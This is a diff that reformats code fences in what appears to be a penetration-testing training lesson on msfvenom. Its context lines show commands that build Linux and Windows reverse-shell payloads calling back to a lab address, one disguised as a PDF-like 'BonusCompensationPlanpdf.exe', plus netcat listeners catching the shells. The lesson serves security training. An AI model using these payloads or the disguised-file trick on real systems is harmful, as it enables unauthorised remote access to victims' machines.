@@ -14,8 +14,7 @@ In Pwnbox or any host with MSFvenom installed, we can issue the command `msfveno
 
 #### List Payloads
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -l payloads
 
 Framework Payloads (592 total) [--payload <value>]
@@ -100,8 +99,7 @@ Now let's build a simple stageless payload with msfvenom and break down the comm
 
 #### Build It
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
 
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -113,8 +111,7 @@ Final size of elf file: 194 bytes
 
 #### Call MSFvenom
 
-```
-        shellsession
+```shellsession
 msfvenom
 ```
 
@@ -122,8 +119,7 @@ Defines the tool used to make the payload.
 
 #### Creating a Payload
 
-```
-        shellsession
+```shellsession
 -p
 ```
 
@@ -131,8 +127,7 @@ This `option` indicates that msfvenom is creating a payload.
 
 #### Choosing the Payload based on Architecture
 
-```
-        shellsession
+```shellsession
 linux/x64/shell_reverse_tcp
 ```
 
@@ -140,8 +135,7 @@ Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based re
 
 #### Address To Connect Back To
 
-```
-        shellsession
+```shellsession
 LHOST=10.10.14.113 LPORT=443
 ```
 
@@ -149,8 +143,7 @@ When executed, the payload will call back to the specified IP address (`10.10.14
 
 #### Format To Generate Payload In
 
-```
-        shellsession
+```shellsession
 -f elf
 ```
 
@@ -158,8 +151,7 @@ The `-f` flag specifies the format the generated binary will be in. In this case
 
 #### Output
 
-```
-        shellsession
+```shellsession
 > createbackup.elf
 ```
 
@@ -188,8 +180,7 @@ We would have a listener ready to catch the connection on the attack box side up
 
 #### NC Connection
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lvnp 443
 ```
 
@@ -197,8 +188,7 @@ When the file is executed, we see that we have caught a shell.
 
 #### Connection Established
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lvnp 443
 
 Listening on 0.0.0.0 443
@@ -227,8 +217,7 @@ We can also use msfvenom to craft an executable (`.exe`) file that can be run on
 
 #### Windows Payload
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -250,8 +239,7 @@ This is another situation where we need to be creative in getting this payload d
 
 If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lvnp 443
 
 Listening on 0.0.0.0 443
